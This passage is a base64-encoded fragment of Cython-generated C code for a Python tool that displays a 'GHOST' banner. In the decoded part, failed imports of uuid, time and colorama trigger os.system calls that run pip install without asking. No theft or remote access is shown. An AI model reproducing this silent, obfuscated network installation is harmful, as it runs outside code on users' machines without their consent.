ycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0w4M19leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7XG4gICAgX19weXhfTDg3X3RyeV9lbmQ6O1xuICB9XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfOCwgJl9fcHl4X3RfNywgJl9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hhc2hsaWIsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA2MSwgX19weXhfTDkwX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hhc2hsaWIsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCA2MSwgX19weXhfTDkwX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBnb3RvIF9fcHl4X0w5NV90cnlfZW5kO1xuICAgIF9fcHl4X0w5MF9lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcblxuICAgIFxuICAgICB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzUsICZfX3B5eF90XzIsICZfX3B5eF90XzMpIDwgMCkgX19QWVhfRVJSKDAsIDYyLCBfX3B5eF9MOTJfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMTAgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNjMsIF9fcHl4X0w5Ml9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCA2MywgX19weXhfTDkyX2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3BpcF9pbnN0YWxsX3V1aWR9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzksIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNjMsIF9fcHl4X0w5Ml9leGNlcHRfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgfVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBnb3RvIF9fcHl4X0w5MV9leGNlcHRpb25faGFuZGxlZDtcbiAgICB9XG5cbiAgICBcbiAgICBfX3B5eF9MOTJfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfNywgX19weXhfdF8xKTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0w5MV9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7XG4gICAgX19weXhfTDk1X3RyeV9lbmQ6O1xuICB9XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfNywgJl9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3V1aWQsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA2NSwgX19weXhfTDk4X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3V1aWQsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA2NSwgX19weXhfTDk4X2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICBnb3RvIF9fcHl4X0wxMDNfdHJ5X2VuZDtcbiAgICBfX3B5eF9MOThfZXJyb3I6O1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG5cbiAgICBcbiAgICAge1xuICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJvcCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8zLCAmX19weXhfdF8yLCAmX19weXhfdF81KSA8IDApIF9fUFlYX0VSUigwLCA2NiwgX19weXhfTDEwMF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF85ID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDY3LCBfX3B5eF9MMTAwX2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNjcsIF9fcHl4X0wxMDBfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfdGltZX07XG4gICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTEsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNjcsIF9fcHl4X0wxMDBfZXhjZXB0X2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgZ290byBfX3B5eF9MOTlfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuXG4gICAgXG4gICAgX19weXhfTDEwMF9leGNlcHRfZXJyb3I6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDk5X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTtcbiAgICBfX3B5eF9MMTAzX3RyeV9lbmQ6O1xuICB9XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfOCwgJl9fcHl4X3RfNywgJl9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeUxpc3RfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfRm9yZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1N0eWxlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxMDZfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29sb3JhbWEsIF9fcHl4X3RfNSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMTA2X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfRm9yZSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMTA2X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0ZvcmUsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCA2OSwgX19weXhfTDEwNl9lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgX19weXhfdF81ID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9TdHlsZSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMTA2X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1N0eWxlLCBfX3B5eF90XzUpIDwgKDApKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxMDZfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gICAgICBcbiAgICB9XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgZ290byBfX3B5eF9MMTExX3RyeV9lbmQ7XG4gICAgX19weXhfTDEwNl9lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcblxuICAgIFxuICAgICB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzIsICZfX3B5eF90XzUsICZfX3B5eF90XzMpIDwgMCkgX19QWVhfRVJSKDAsIDcwLCBfX3B5eF9MMTA4X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzExID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCA3MSwgX19weXhfTDEwOF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTtcbiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA3MSwgX19weXhfTDEwOF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3BpcF9pbnN0YWxsX2NvbG9yYW1hfTtcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMTA4X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICB9XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDEwN19leGNlcHRpb25faGFuZGxlZDtcbiAgICB9XG5cbiAgICBcbiAgICBfX3B5eF9MMTA4X2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MMTA3X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfNywgX19weXhfdF8xKTtcbiAgICBfX3B5eF9MMTExX3RyeV9lbmQ6O1xuICB9XG5cbiAgXG4gIF9fcHl4X3RfNSA9IE5VTEw7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTtcbiAgX19weXhfdF8yID0gX19weXhfYnVpbHRpbl9wcmludDsgXG4gIF9fcHl4X3RfNiA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xNH07XG4gICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA3MywgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IE5VTEw7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVuZGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19weXhfdF80ID0gX19QeXhfUHlMaXN0X1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JsYWNrLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmxhY2spOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA3NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuXG4gIFxuICBfX3B5eF90XzYgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDUgOiAwKV0gPSB7X19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1R9O1xuICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mb250LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmxvY2ssIF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzKzIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wxX2Vycm9yKVxuICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9B